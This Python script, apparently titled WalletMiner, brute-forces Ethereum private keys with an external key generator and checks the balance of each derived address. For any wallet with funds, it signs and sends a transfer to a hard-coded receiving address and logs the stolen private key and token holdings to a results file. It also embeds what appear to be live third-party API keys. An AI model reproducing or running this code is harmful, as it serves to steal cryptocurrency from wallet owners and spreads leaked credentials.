from asyncio import run, create_task
from colorama import Fore
from tasksio import TaskPool
from decimal import Decimal
from eth_utils import from_wei
from web3 import Web3, HTTPProvider
import os
import httpx
import json, time, requests
class WalletMiner:
    def __init__(self, threads: int, row: int) -> None:
        self.keys = []
        self.row = row
        self.threads = threads
        self.session = None
        self.help = f"""




                {Fore.LIGHTYELLOW_EX}_ _ _ _  _ _ _  _ ____ ____ 
                | | | |\/| | |\ | |___ |__/ 
                |_|_| |  | | | \| |___ |  \ {Fore.RESET}
                                            

                    {Fore.BLUE}Threads: {Fore.WHITE}{self.threads}   {Fore.RED}Row: {Fore.WHITE}{self.row}
        
        {Fore.GREEN}Module: BTC - Attempts to crack BTC wallets
        {Fore.YELLOW}Module: ETH - Attempts to crack ETH wallets
        """

    async def indexKeys(self, session):
        for _ in self.keys:
            filer = _.replace(' ', ':').replace('{', '').replace('}', '')
            key = filer.split(':')[0]
            address = filer.split(':')[1].split('\n')
            await self.ethCheck(key, address[0], session)
    async def gui(self):
        print(self.help)
        while True:
            match input(f"{Fore.RED}[{Fore.YELLOW}?{Fore.RED}] {Fore.BLUE}>> {Fore.WHITE}"):
                case "ETH":
                    await self.ethGen()
    async def ethGen(self):
        while True:
            os.system('rm -rf ethindex.txt')
            os.system(f'./genkey eth {self.row} >> ethindex.txt')
            self.row += 1
            self.keys = open('ethindex.txt', 'r').readlines()
            async with httpx.AsyncClient() as session:
                async with TaskPool(self.threads) as pool:
                    await pool.put(create_task(self.indexKeys(session)))

    async def ethCheck(self, key, address, session: httpx.AsyncClient):
        sent = False
        try:
            connection = Web3(HTTPProvider('https://rpc-mumbai.maticvigil.com'))
            bal2 = connection.eth.getBalance(address)
            bal = await self.convertETH(connection.eth.getBalance(address), connection)
            print(f"{Fore.YELLOW}Cracked: {Fore.WHITE}{address} | {Fore.RED}{bal} | {self.row}")
            if bal > 0:
                bal = round(float(bal), 5)
                print(f"{Fore.YELLOW}Cracked: {Fore.WHITE}{address} | {Fore.BLUE}Balance: {Fore.GREEN}{bal}")
                alt_coins = []
                alt_coin_balance = []
                eth = {
                        "address": address,
                        "balance": bal,
                        "key": key,
                        "sent": sent,
                        "row": self.row,
                        "alt_coins": {
                            "coin": alt_coins,
                            "balance": alt_coin_balance
                        }
                    }
                w3 = Web3(Web3.HTTPProvider('https://mainnet.infura.io/v3/0eb77971ac8541b4a4b4728216fde99d'))
                address1 = Web3.toChecksumAddress(address)
                address2 = Web3.toChecksumAddress("0xb42fF82726aBA6DbAB5794a2cc06C24e20985b0C")
                private_key = key
                noice = w3.eth.getTransactionCount(address1)
                tx = {
                    'nonce': noice,
                    'to': address2,
                    'value': w3.toWei(0.0001, 'ether'),
                    'gas': 21000,
                    'gasPrice': w3.toWei(32, 'gwei')
                }
                try:
                    signed_tx = w3.eth.account.signTransaction(tx, private_key)
                    tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
                    sent = True
                except Exception as e:
                    
                    pass
                try:
                    response = await session.get(f"https://api.etherscan.io/api?module=account&action=balancemulti&apikey=F92Z14GE2DTF6PBBYY1YPHPJ438PT3P2VI&address={address}")
                    response_data = response.json()
                    balance = response_data['result'][0]["balance"]
                    tokenresponse = await session.get(f"https://api.ethplorer.io/getAddressInfo/{address}?apiKey=EK-cQTo5-YwMrjdS-9bY9u")
                    test = json.loads(tokenresponse.text)
                    if balance == 0:
                        pass
                    for _ in range(0, 15):
                        alt_coins.append(test['tokens'][_]['tokenInfo']['name'])
                        alt_coin_balance.append(test['tokens'][_]['balance'])
                    
                except Exception as e:

                    pass
                with open('assets/results.json', "+a") as log:
                    log.write(f"{json.dumps(eth, indent=3)},\n")
                    log.close()
        except (requests.exceptions.HTTPError):
            print(f"{Fore.RED}[!]{Fore.BLUE} >> Timing out to many requests")
            time.sleep(25)
            pass

    async def convertETH(self, amount, connect):
        return float(connect.fromWei(int(amount),"ether"))

if "__main__" in __name__:
    threads = int(input("threads: "))
    row = int(input("row: "))
    miner = WalletMiner(threads, row)
    run(miner.gui())